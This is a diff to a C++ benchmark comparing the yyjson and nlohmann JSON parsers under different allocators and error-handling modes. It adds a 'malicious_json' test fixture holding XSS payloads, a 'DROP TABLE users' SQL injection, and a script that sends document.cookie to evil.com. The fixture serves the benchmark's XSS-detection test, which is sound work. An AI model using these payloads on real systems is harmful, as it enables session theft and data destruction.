@@ -2583,14 +2583,36 @@ BENCHMARK_CAPTURE(parse_ctre, long_, long_config_text)->MinTime(2);
  */
 #include <cstring> // `std::memset`, `std::memmove`
 
-static constexpr std::string_view sample_json = R"({
-    "meta": { "id": 42, "valid": true, "coordinates": [ 0.0, 0.0 ] },
+static constexpr std::string_view valid_json = R"({
+    "meta": { "id": 42, "valid": true, "coordinates": [ 0.0, 0.0 ], "nesting": [ [ [ null ] ] ] },
     "greetings": [
         { "language": "English", "text": "Hello there! How are you doing on this sunny day?" },
         { "language": "日本語", "text": "こんにちは！今日は晴れていますが、お元気ですか？" },
         { "language": "Español", "text": "Hola a todos, ¿cómo estáis hoy tan soleado?" }
     ]
 })";
+
+static constexpr std::string_view invalid_json = R"({
+    "meta": { "id": 42, "valid": true, "coordinates": [ 1.234, 5.678 ], "nesting": [ [ [ null ] ] ] },
+    "greetings": [
+        { "language": "English", "text": "Hello there! How are you doing on this sunny day?" },
+        { "language": "日本語", "text": "こんにちは！今日は晴れていますが、お元気ですか？" },
+        { "language": "Español", "text": "Hola a todos, ¿cómo estáis hoy tan soleado?" }
+    ],
+    "source": "127.0.0.1, // no inline comments in vanilla JSON!
+})"; // Missing closing quote, inline comment, and trailing comma - pick your poison 😁
+
+static constexpr std::string_view malicious_json = R"({
+    "meta": { "id": "<script>alert(document.cookie)</script>", "valid": true, "nesting": [ [ [ null ] ] ] },
+    "greetings": [
+        { "language": "English", "text": "Hello there! <img src=x onerror='alert(1)'>" },
+        { "language": "HTML", "text": "<iframe src='javascript:alert(`XSS`)'></iframe>" },
+        { "language": "SQL", "text": "'; DROP TABLE users; --" }
+    ],
+    "comment": "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://evil.com/steal?cookie=' + document.cookie);</script>"
+})"; // SQL injection, XSS, and a cookie-stealing script while we're at it 😁
+
+static constexpr std::string_view packets_json[3] = {valid_json, invalid_json, malicious_json};
 
 struct fixed_buffer_arena_t {
     static constexpr std::size_t capacity = 4096;
@@ -2606,7 +2628,7 @@ struct fixed_buffer_arena_t {
  *  @brief  Allocates a new chunk of `size` bytes from the arena.
  *  @return The new pointer or `nullptr` if OOM.
  */
-std::byte *allocate_from_arena(fixed_buffer_arena_t &arena, std::size_t size) noexcept {
+inline std::byte *allocate_from_arena(fixed_buffer_arena_t &arena, std::size_t size) noexcept {
     if (arena.total_allocated + size > fixed_buffer_arena_t::capacity) return nullptr; // Not enough space
     std::byte *ptr = arena.buffer + arena.total_allocated;
     arena.total_allocated += size;
@@ -2617,7 +2639,7 @@ std::byte *allocate_from_arena(fixed_buffer_arena_t &arena, std::size_t size) no
  *  @brief  Deallocates a chunk of memory previously allocated from the arena.
  *          This implementation does not "reuse" partial free space unless everything is freed.
  */
-void deallocate_from_arena(fixed_buffer_arena_t &arena, std::byte *ptr, std::size_t size) noexcept {
+inline void deallocate_from_arena(fixed_buffer_arena_t &arena, std::byte *ptr, std::size_t size) noexcept {
     // Check if ptr is within the arena
     std::byte *start = arena.buffer;
     std::byte *end = arena.buffer + fixed_buffer_arena_t::capacity;
@@ -2633,7 +2655,7 @@ void deallocate_from_arena(fixed_buffer_arena_t &arena, std::byte *ptr, std::siz
  *          Otherwise, do allocates, copies, and frees.
  *  @return The new pointer or `nullptr` if OOM.
  */
-std::byte *reallocate_from_arena( //
+inline std::byte *reallocate_from_arena( //
     fixed_buffer_arena_t &arena, std::byte *ptr, std::size_t old_size, std::size_t new_size) noexcept {
     if (!ptr) return allocate_from_arena(arena, new_size); //  A fresh allocation
 
@@ -2759,25 +2781,30 @@ static void json_yyjson(bm::State &state) {
     // Repeat the checks many times
     std::size_t bytes_processed = 0;
     std::size_t peak_memory_usage = 0;
+    std::size_t iteration = 0;
     for (auto _ : state) {
+
+        std::string_view packet_json = packets_json[iteration++ % 3];
+        bytes_processed += packet_json.size();
+
+        yyjson_read_err error;
+        std::memset(&error, 0, sizeof(error));
+
         yyjson_doc *doc = yyjson_read_opts(                 //
-            (char *)sample_json.data(), sample_json.size(), //
+            (char *)packet_json.data(), packet_json.size(), //
             YYJSON_READ_NOFLAG, use_arena ? &alc : NULL, &error);
-        yyjson_val *root = yyjson_doc_get_root(doc);
-        bm::DoNotOptimize(contains_xss_in_yyjson(root));
-        bytes_processed += sample_json.size();
+        if (!error.code) bm::DoNotOptimize(contains_xss_in_yyjson(yyjson_doc_get_root(doc)));
         peak_memory_usage = std::max(peak_memory_usage, arena.total_allocated);
         yyjson_doc_free(doc);
-        if (error.code) state.SkipWithError(error.msg);
     }
     state.SetBytesProcessed(bytes_processed);
     state.counters["peak_memory_usage"] = bm::Counter(peak_memory_usage, bm::Counter::kAvgThreads);
 }
 
-BENCHMARK(json_yyjson<false>)->MinTime(5)->Name("json_yyjson<malloc>");
-BENCHMARK(json_yyjson<true>)->MinTime(5)->Name("json_yyjson<fixed_buffer>");
-BENCHMARK(json_yyjson<false>)->MinTime(5)->Name("json_yyjson<malloc>")->Threads(physical_cores());
-BENCHMARK(json_yyjson<true>)->MinTime(5)->Name("json_yyjson<fixed_buffer>")->Threads(physical_cores());
+BENCHMARK(json_yyjson<false>)->MinTime(10)->Name("json_yyjson<malloc>");
+BENCHMARK(json_yyjson<true>)->MinTime(10)->Name("json_yyjson<fixed_buffer>");
+BENCHMARK(json_yyjson<false>)->MinTime(10)->Name("json_yyjson<malloc>")->Threads(physical_cores());
+BENCHMARK(json_yyjson<true>)->MinTime(10)->Name("json_yyjson<fixed_buffer>")->Threads(physical_cores());
 
 /**
  *  The `nlohmann::json` library is designed to be simple and easy to use, but it's
@@ -2890,14 +2917,36 @@ bool contains_xss_nlohmann(json_type_ const &j) noexcept {
 using default_json = json_with_alloc<std::allocator>;
 using fixed_buffer_json = json_with_alloc<fixed_buffer_allocator>;
 
-template <typename json_type_>
+template <typename json_type_, bool use_exceptions>
 static void json_nlohmann(bm::State &state) {
     std::size_t bytes_processed = 0;
     std::size_t peak_memory_usage = 0;
+    std::size_t iteration = 0;
     for (auto _ : state) {
-        json_type_ json = json_type_::parse(sample_json);
-        bm::DoNotOptimize(contains_xss_nlohmann(json));
-        bytes_processed += sample_json.size();
+
+        std::string_view packet_json = packets_json[iteration++ % 3];
+        bytes_processed += packet_json.size();
+
+        json_type_ json;
+        // The vanilla default (recommended) behavior is to throw exceptions on parsing errors.
+        // As we know from the error handling benchmarks, exceptions can be extremely slow,
+        // if they are thrown frequently.
+        if constexpr (use_exceptions) {
+            try {
+                json = json_type_::parse(packet_json);
+                bm::DoNotOptimize(contains_xss_nlohmann(json));
+            }
+            catch (typename json_type_::exception const &e) {
+                continue;
+            }
+        }
+        // There is, however, a much nicer way to do it avoiding exceptions.
+        // https://json.nlohmann.me/features/parsing/parse_exceptions/#switch-off-exceptions
+        //
+        else {
+            json = json_type_::parse(packet_json, nullptr, false);
+            if (!json.is_discarded()) bm::DoNotOptimize(contains_xss_nlohmann(json));
+        }
         if constexpr (!std::is_same_v<json_type_, default_json>)
             peak_memory_usage = std::max(peak_memory_usage, local_arena.total_allocated);
     }
@@ -2905,24 +2954,36 @@ static void json_nlohmann(bm::State &state) {
     state.counters["peak_memory_usage"] = bm::Counter(peak_memory_usage, bm::Counter::kAvgThreads);
 }
 
-BENCHMARK_TEMPLATE(json_nlohmann, default_json)->MinTime(5)->Name("json_nlohmann<std::allocator>");
-BENCHMARK_TEMPLATE(json_nlohmann, fixed_buffer_json)->MinTime(5)->Name("json_nlohmann<fixed_buffer>");
-BENCHMARK_TEMPLATE(json_nlohmann, default_json)
-    ->MinTime(5)
-    ->Name("json_nlohmann<std::allocator>")
+BENCHMARK(json_nlohmann<default_json, true>)->MinTime(10)->Name("json_nlohmann<std::allocator, throw>");
+BENCHMARK(json_nlohmann<fixed_buffer_json, true>)->MinTime(10)->Name("json_nlohmann<fixed_buffer, throw>");
+BENCHMARK(json_nlohmann<default_json, false>)->MinTime(10)->Name("json_nlohmann<std::allocator, noexcept>");
+BENCHMARK(json_nlohmann<fixed_buffer_json, false>)->MinTime(10)->Name("json_nlohmann<fixed_buffer, noexcept>");
+BENCHMARK(json_nlohmann<default_json, true>)
+    ->MinTime(10)
+    ->Name("json_nlohmann<std::allocator, throw>")
     ->Threads(physical_cores());
-BENCHMARK_TEMPLATE(json_nlohmann, fixed_buffer_json)
-    ->MinTime(5)
-    ->Name("json_nlohmann<fixed_buffer>")
+BENCHMARK(json_nlohmann<fixed_buffer_json, true>)
+    ->MinTime(10)
+    ->Name("json_nlohmann<fixed_buffer, throw>")
+    ->Threads(physical_cores());
+BENCHMARK(json_nlohmann<default_json, false>)
+    ->MinTime(10)
+    ->Name("json_nlohmann<std::allocator, noexcept>")
+    ->Threads(physical_cores());
+BENCHMARK(json_nlohmann<fixed_buffer_json, false>)
+    ->MinTime(10)
+    ->Name("json_nlohmann<fixed_buffer, noexcept>")
     ->Threads(physical_cores());
 
 /**
- *  The results are as expected for the single-threaded case and the multi-threaded case:
+ *  The results for the single-threaded case and the multi-threaded case are:
  *
- *  - `json_yyjson<malloc>`:                @b 280 ns       @b 419 ns
- *  - `json_yyjson<fixed_buffer>`:          @b 222 ns       @b 387 ns
- *  - `json_nlohmann<std::allocator>`:      @b 2'773 ns     @b 5'227 ns
- *  - `json_nlohmann<fixed_buffer>`:        @b 2'610 ns     @b 4'438 ns
+ *  - `json_yyjson<malloc>`:                       @b 291 ns       @b 554 ns
+ *  - `json_yyjson<fixed_buffer>`:                 @b 263 ns       @b 468 ns
+ *  - `json_nlohmann<std::allocator, throw>`:      @b 6'330 ns     @b 9'370 ns
+ *  - `json_nlohmann<fixed_buffer, throw>`:        @b 4'915 ns     @b 8'130 ns
+ *  - `json_nlohmann<std::allocator, noexcept>`:   @b 4'108 ns     @b 6'963 ns
+ *  - `json_nlohmann<fixed_buffer, noexcept>`:     @b 4'075 ns     @b 6'194 ns
  *
  *  Some of Unum's libraries, like `usearch` can take multiple allocators for
  *  different parts of a complex hybrid data-structure with clearly divisible
